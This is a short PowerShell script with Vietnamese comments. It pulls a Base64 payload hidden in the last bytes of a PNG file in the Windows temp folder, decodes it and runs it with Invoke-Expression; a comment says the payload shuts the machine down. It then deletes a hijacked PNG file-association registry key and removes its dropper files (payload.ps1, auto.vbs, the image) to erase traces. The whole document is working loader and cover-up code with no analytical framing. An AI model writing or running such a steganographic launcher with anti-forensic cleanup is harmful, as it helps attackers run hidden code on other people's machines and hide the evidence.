# Đọc dữ liệu từ ảnh
$data = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\payload.png")

# Giải mã payload từ Base64
$payload = -join ($data[-30..-1] | ForEach-Object { [char]$_ })
$decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))

# Thực thi payload (tắt máy)
Invoke-Expression $decoded

# Xóa registry và file sau khi thực thi
Remove-Item -Path 'HKCU:\Software\Classes\pngfile\shell\open\command' -Force
Remove-Item -Path 'C:\Windows\Temp\payload.ps1' -Force
Remove-Item -Path 'C:\Windows\Temp\auto.vbs' -Force
Remove-Item -Path 'C:\Windows\Temp\payload.png' -Force
